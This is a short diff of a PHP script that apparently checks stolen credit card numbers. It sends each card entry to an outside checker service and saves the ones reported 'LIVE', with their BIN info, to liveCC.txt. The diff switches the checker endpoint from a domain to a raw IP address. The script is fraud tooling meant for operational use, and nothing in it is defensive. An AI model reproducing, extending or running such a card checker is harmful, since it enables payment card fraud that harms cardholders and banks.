@@ -18,7 +18,7 @@ $amountList = count($delimeter);
 
 foreach($delimeter as $format) {
 $format = trim($format);
-    $response = file_get_contents("http://malenk.io/tololl/?format=".trim($format));
+    $response = file_get_contents("http://162.144.238.170/~malenkio/tololl/?format=".trim($format));
     if(json_decode($response,1)['status'] == "LIVE") {
       echo "[".date("Y-m-d H:i:s")."] [".$checkTotal."/".$amountList."] ".$format." - ".@json_decode($response,1)['bin_info']." => LIVE\n";
       file_put_contents("liveCC.txt", $format." ".json_decode($response,1)['bin_info']."\n", FILE_APPEND);
